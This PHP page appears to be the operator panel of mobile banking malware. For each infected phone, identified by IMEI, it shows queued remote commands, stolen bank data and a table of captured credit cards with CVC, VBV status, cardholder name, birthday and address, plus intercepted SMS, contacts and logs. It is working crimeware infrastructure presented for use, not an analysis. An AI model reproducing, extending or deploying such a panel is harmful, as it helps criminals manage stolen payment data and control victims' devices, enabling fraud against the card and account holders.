<?php
session_start();
require_once './config/config.php';
require_once 'includes/auth_validate.php';


// Sanitize if you want
$client_id = filter_input(INPUT_GET, 'client_id', FILTER_VALIDATE_INT);
$client_imei = filter_input(INPUT_GET, 'client_imei', FILTER_SANITIZE_STRING);
$operation = filter_input(INPUT_GET, 'operation',FILTER_SANITIZE_STRING);
($operation == 'edit') ? $edit = true : $edit = false;
//Handle update request
if ($_SERVER['REQUEST_METHOD'] == 'POST')
{
    $client_id = filter_input(INPUT_GET, 'client_id', FILTER_VALIDATE_INT);

    $data_to_update = filter_input_array(INPUT_POST);

    #$data_to_update['updated_at'] = date('Y-m-d H:i:s');

    $db->where('id',$client_id);
    $stat = $db->update('clients', $data_to_update);

    if($stat)
    {
        $_SESSION['success'] = "Client updated successfully!";
        header('location: clients.php');
        exit();
    }
}
if ($client_imei){
    $db->where('imei', $client_imei);
    $client = $db->getOne("clients");
    if ($client) $client_id = $client['id'];
}

if($edit)
{
    $db->where('id', $client_id);
    $client = $db->getOne("clients");

}

require_once 'includes/header.php';
?>

    <div id="page-wrapper">
        <div class="row">
            <h2 class="page-header">Update Client</h2>

        </div>
        <!-- Success message -->
        <?php
        include('./includes/flash_messages.php')
        ?>
        <form class="" action="" method="post" enctype="multipart/form-data" id="client_form">
            <?php  include_once('./includes/forms/client_form.php'); ?>
        </form>


        <!-- command list for the client -->
        <br>
        <div class="row">
            <h2 class="page-header">Client commands</h2>
        </div>
        <?php
        $db->where('imei', '%' . $client['imei'] . '%', 'like');
        $commands = $db->get("commands");
        ?>
        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>Command name</th>
                <th>Command</th>
                <th>Actions</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($commands as $row) { ?>
                <tr>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['imei'] ?></td>
                    <td><?php echo $row['command_name'] ?></td>
                    <td><?php echo base64_decode($row['command']) ?></td>
                    <td>
                        <a href="" class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
                </tr>

                <!-- Delete Confirmation Modal-->
                <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                    <div class="modal-dialog">
                        <form action="delete_command.php" method="POST">
                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Confirm</h4>
                                </div>
                                <div class="modal-body">
                                    <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">
                                    <p>Are you sure you want to delete this command?</p>
                                </div>
                                <div class="modal-footer">
                                    <button type="submit" class="btn btn-default pull-left">Yes</button>
                                    <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>
            <?php } ?>
            </tbody>
        </table>


        <!-- Banks list for the client -->
        <br>
        <div class="row">
            <h2 class="page-header">Banks</h2>
        </div>
        <?php
        $db->where('imei', '%' . $client['imei'] . '%', 'like');
        $banks = $db->get("banks");
        ?>
        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>Data</th>
                <th>Time</th>
                <th>Actions</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($banks as $row) { ?>
                <tr>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['imei'] ?></td>
                    <td><?php echo $row['data'] ?></td>
                    <td><?php echo date("Y-m-d H:i",$row['time']) ?></td>
                    <td>
                        <a href=""  class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
                </tr>

                <!-- Delete Confirmation Modal-->
                <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                    <div class="modal-dialog">
                        <form action="delete_bank.php" method="POST">
                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Confirm</h4>
                                </div>
                                <div class="modal-body">
                                    <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">
                                    <p>Are you sure you want to delete this bank?</p>
                                </div>
                                <div class="modal-footer">
                                    <button type="submit" class="btn btn-default pull-left">Yes</button>
                                    <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>
            <?php } ?>
            </tbody>
        </table>



        <!-- CC list for the client -->
        <br>
        <div class="row">
            <h2 class="page-header">CC list</h2>
        </div>
        <?php
        $db->where('IMEI', '%' . $client['imei'] . '%', 'like');
        $cc_info = $db->get("cc_info");
        ?>
        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header"><input type="checkbox" class="form-check-input" id="chk" onclick="chkAll()"></th>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>CARD</th>
                <th>type</th>
                <th>MMYY</th>
                <th>CVC</th>
                <th>VBV</th>
                <th>CardholderName</th>
                <th>PhoneNumber</th>
                <th>BirthDay</th>
                <th>ZIP</th>
                <th>Address</th>
                <th>Time</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($cc_info as $row) { ?>
                <tr>
                    <td><input type="checkbox" class="form-check-input" id="chk_imei" value="<?php echo $row['id'] ?>"></td>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['IMEI'] ?></td>
                    <td><?php echo $row['CARD'] ?></td>
                    <td><?php echo $row['typeCard'] ?></td>
                    <td><?php echo $row['MMYY'] ?></td>
                    <td><?php echo $row['CVC'] ?></td>
                    <td><?php echo $row['VBV'] ?></td>
                    <td><?php echo $row['CardholderName'] ?></td>
                    <td><?php echo $row['PhoneNumber'] ?></td>
                    <td><?php echo $row['birth_date'] ?></td>
                    <td><?php echo $row['zip_code'] ?></td>
                    <td><?php echo $row['holder_address'] ?></td>
                    <td><?php echo date("Y-m-d H:i",$row['last_update']) ?></td>
                    <td>
                        <a href="" class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
                </tr>

                <!-- Delete Confirmation Modal-->
                <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                    <div class="modal-dialog">
                        <form action="delete_cc.php" method="POST">
                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Confirm</h4>
                                </div>
                                <div class="modal-body">
                                    <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">
                                    <p>Are you sure you want to delete this command?</p>
                                </div>
                                <div class="modal-footer">
                                    <button type="submit" class="btn btn-default pull-left">Yes</button>
                                    <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>
            <?php } ?>
            </tbody>
        </table>


        <!-- Client messages -->
        <br>
        <div class="row">
            <h2 class="page-header">Client Messages</h2>
        </div>
        <?php
        $db->where('imei', '%' . $client['imei'] . '%', 'like');
        $sms = $db->get("sms");
        ?>
        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>Time</th>
                <th>Text</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($sms as $row) { ?>
                <tr>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['imei'] ?></td>
                    <td><?php echo date("Y-m-d H:i",$row['time']) ?></td>
                    <td><?php echo $row['text'] ?></td>
                    <td>
                        <a href=""  class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
                </tr>

                <!-- Delete Confirmation Modal-->
                <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                    <div class="modal-dialog">
                        <form action="delete_log.php" method="POST">
                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Confirm</h4>
                                </div>
                                <div class="modal-body">

                                    <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">

                                    <p>Are you sure you want to delete this SMS?</p>
                                </div>
                                <div class="modal-footer">
                                    <button type="submit" class="btn btn-default pull-left">Yes</button>
                                    <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>

            <?php } ?>
            </tbody>
        </table>


        <!-- Client contacts -->
        <br>
        <div class="row">
            <h2 class="page-header">Client Contacts</h2>
        </div>
        <?php
        $db->where('imei', '%' . $client['imei'] . '%', 'like');
        $contacts = $db->get("contacts");
        ?>
        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>Name</th>
                <th>Number</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($contacts as $row) { ?>
                <tr>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['imei'] ?></td>
                    <td><?php echo $row['name'] ?></td>
                    <td><?php echo $row['number'] ?></td>
                    <td>
                        <a href=""  class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
                </tr>

                <!-- Delete Confirmation Modal-->
                <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                    <div class="modal-dialog">
                        <form action="delete_contact.php" method="POST">
                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Confirm</h4>
                                </div>
                                <div class="modal-body">

                                    <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">

                                    <p>Are you sure you want to delete this contact?</p>
                                </div>
                                <div class="modal-footer">
                                    <button type="submit" class="btn btn-default pull-left">Yes</button>
                                    <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>

            <?php } ?>
            </tbody>
        </table>


        <!-- Client logs -->
        <br>
        <div class="row">
            <h2 class="page-header">Client Logs</h2>
        </div>
        <?php
        $db->where('imei', '%' . $client['imei'] . '%', 'like');
        $logs = $db->get("logs");
        ?>

        <table class="table table-striped table-bordered table-condensed">
            <thead>
            <tr>
                <th class="header">#</th>
                <th>IMEI</th>
                <th>Time</th>
                <th>Text</th>
                <th>Action</th>
            </tr>
            </thead>
            <tbody>
            <?php
            foreach ($logs as $row) { ?>
                <tr>
                    <td><?php echo $row['id'] ?></td>
                    <td><?php echo $row['imei'] ?></td>
                    <td><?php echo date("Y-m-d H:i",$row['time']) ?></td>
                    <td><?php echo $row['text'] ?></td>
                    <td>
                        <a href=""  class="btn btn-danger delete_btn" data-toggle="modal" data-target="#confirm-delete-<?php echo $row['id'] ?>" style="margin-right: 8px;"><span class="glyphicon glyphicon-trash"></span></td>
                </tr>
                <!-- Delete Confirmation Modal-->
                <div class="modal fade" id="confirm-delete-<?php echo $row['id'] ?>" role="dialog">
                    <div class="modal-dialog">
                        <form action="delete_log.php" method="POST">
                            <!-- Modal content-->
                            <div class="modal-content">
                                <div class="modal-header">
                                    <button type="button" class="close" data-dismiss="modal">&times;</button>
                                    <h4 class="modal-title">Confirm</h4>
                                </div>
                                <div class="modal-body">

                                    <input type="hidden" name="del_id" id = "del_id" value="<?php echo $row['id'] ?>">

                                    <p>Are you sure you want to delete this log?</p>
                                </div>
                                <div class="modal-footer">
                                    <button type="submit" class="btn btn-default pull-left">Yes</button>
                                    <button type="button" class="btn btn-default" data-dismiss="modal">No</button>
                                </div>
                            </div>
                        </form>

                    </div>
                </div>
            <?php } ?>
            </tbody>
        </table>

    </div>






<?php include_once 'includes/footer.php'; ?>